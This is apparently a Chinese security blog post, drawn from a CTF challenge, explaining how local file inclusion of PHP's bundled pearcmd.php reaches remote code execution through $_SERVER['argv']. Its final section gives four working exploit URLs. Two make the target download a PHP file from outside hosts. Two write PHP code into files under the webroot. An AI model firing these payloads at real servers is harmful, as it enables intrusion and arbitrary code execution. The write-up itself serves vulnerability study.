date: 2020-10-20
categories:
- web
tags:
- LFI
- php
- web
- RCE
title: LFI利用php自带的pearcmd.php直接RCE
---
# LFI利用php自带的pearcmd.php直接RCE

在做巅峰极客的一题时，用到了包含pearcmd.php从而RCE的点（perlcmd.php也是一样的），今天来研究一下这个点

## 产生原因

阅读pearcmd.php中关于参数产生的那部分代码发现：

```php
...
if (!isset($_SERVER['argv']) && !isset($argv) && !isset($HTTP_SERVER_VARS['argv'])) {
    echo 'ERROR: either use the CLI php executable, ' .
         'or set register_argc_argv=On in php.ini';
    exit(1);
}

$argv = Console_Getopt::readPHPArgv();
...
array_shift($argv);//这里删除了第一个argv，通常argv[0]是程序名
...
```



`Getopt.php:readPHPArgv`

```php

    public static function readPHPArgv()
    {
        global $argv;
        if (!is_array($argv)) {
            if (!@is_array($_SERVER['argv'])) {
                if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) {
                    $msg = "Could not read cmd args (register_argc_argv=Off?)";
                    return PEAR::raiseError("Console_Getopt: " . $msg);
                }
                return $GLOBALS['HTTP_SERVER_VARS']['argv'];
            }
            return $_SERVER['argv'];
        }
        return $argv;
    }
```



我们发现这里的参数是从`$_SERVER['argv']`（旧版本的就是：`$GLOBALS['HTTP_SERVER_VARS']['argv']`）中获取的

我们来测试一下`$_SERVER['arvg']`,测试代码：`var_dump($_SERVER['argv']);`

访问http://127.0.0.1:60080/?1+2+3+4+%20+%dd

```
/var/www/html/index.php:4:
array (size=6)
  0 => string '1' (length=1)
  1 => string '2' (length=1)
  2 => string '3' (length=1)
  3 => string '4' (length=1)
  4 => string '%20' (length=3)
  5 => string '%dd' (length=3)
```

在$_SERVER['argv']中的所有url编码都不会被解析，只是当成普通字符串，而+会被解析成参数的分隔符

于是我们便可以像在命令行一样调用pearcmd.php了，接下来就变成了利用pearcmd这个命令getshell，直接命令行尝试（太懒了）

查看pearcmd.php的帮助：`php pearcmd.php [options] command [command-options] <parameters>`，那么我们传参就得变成

`url/?+[options]+command+[command-options]+<parameters>`，?后面必须跟一个+号让其作为$argv[0],这里要注意+号的数量，因为这是拿来作为分隔符的如：`?++`就会被解析成`["","",""]`



## 利用条件

![image1911](https://raw.githubusercontent.com/Explorersss/photo/master/20201020153757.png)

1. register_argc_argv=On（默认是开的）
2. 包含pearcmd.php或者peclcmd.php






## payload
这里直接给出payload，都是直接看帮助写出来的，没啥好说的。



exp1:

需要出网

```
http://192.168.43.230:60080/?+install+--installroot+/tmp/+http://ccreater.top:60006/evil.php++++++++++++++$&f=pearcmd.php&#把GET参数都塞到最后面
http://192.168.43.230:60080/?f=/tmp/tmp/pear/download/install.php
```



exp2:

需要出网

会下载到当前文件夹

```
http://192.168.43.230:60080/?+download+https://fuckyou.free.beeceptor.com/fuckyou.php+&f=pearcmd.php#都塞到最后面
http://192.168.43.230:60080/?f=fuckyou.php
```



exp3:

```php
http://192.168.43.230:60080/?+config-create+/<?=phpinfo();?>/*+/var/www/html/&f=pearcmd.php&XDEBUG_SESSION_START=PHPSTORM.php#把GET参数都塞到路径中，这里可以用url编码来防止空格,/等对文件生成造成影响的字符
http://192.168.43.230:60080/&f=pearcmd.php&XDEBUG_SESSION_START=PHPSTORM.php
```



exp4:

**最好用**

```
http://192.168.43.230:60080/?+-c+/var/www/html/config2.php+-d+man_dir=<?phpinfo();?>/*+-s+list&f=pearcmd.php&XDEBUG_SESSION_START=PHPSTORM#参数塞到最后面
http://192.168.43.230:60080/config2.php
```

